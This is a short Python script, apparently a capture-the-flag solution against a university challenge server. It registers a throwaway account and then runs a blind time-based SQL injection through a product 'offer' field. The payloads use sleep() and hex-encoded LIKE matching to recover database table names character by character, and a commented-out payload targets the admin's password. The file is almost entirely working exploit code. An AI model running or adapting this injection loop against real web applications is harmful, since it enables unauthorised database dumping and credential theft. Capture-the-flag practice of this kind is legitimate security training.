import requests
from bs4 import BeautifulSoup
import string
import random
import binascii
import time

def sth(input_string):
    encoded_bytes = input_string.encode('utf-8')
    hex_representation = binascii.hexlify(encoded_bytes).decode('utf-8')
    return hex_representation.upper()



url = 'http://cyberchallenge.disi.unitn.it:50050'

s = requests.Session()

username = ''.join(random.choices(string.ascii_lowercase, k=10))
password = ''.join(random.choices(string.ascii_lowercase, k=10))

res = s.post(url + '/register', data={'username': username, 'password': password, 'confirm_password': password})

res = s.post(url + '/login', data={'username': username, 'password': password})
print(res.text)


tables = [
    'product',
    'user'
]

user = [
    'id',
    'username',
    'password'
]
# injection = f"1 And (Select sleep(5) From INFOrMATION_SCHEMA.tables Where table_schema = DATABASE() And HEX(table_name) like '{sth(secret + c)}%')"

secret = ''
while True:
    found = False
    for c in string.printable:
        # res = s.post(url + '/login', data={'username': username, 'password': password})

        # this needs to be a blind timing sql injection
        # first dump all table names

        # injection = f"1 And (Select sleep(4) From user Where username = 'admin' And HEX(passwOrd) like '{sth(secret + c)}%')"
        injection = f"1 And (Select sleep(5) From INFOrMATION_SCHEMA.tables Where table_schema = DATABASE() And HEX(table_name) like '{sth(secret + c)}%')"

        print('Trying:', secret + c)
        
        data = {
            'offer': injection,
        }

        start = time.time()
        response = s.post(url + f'/product/1', data=data)
        end = time.time()

        if end - start > 2:
            secret += c
            found = True
            print(f'New character found ({c}): {secret}')
            continue
        else:
            pass

    if not found:
        break

# pyclip.copy(secret)
print(f'Secret: {secret}')

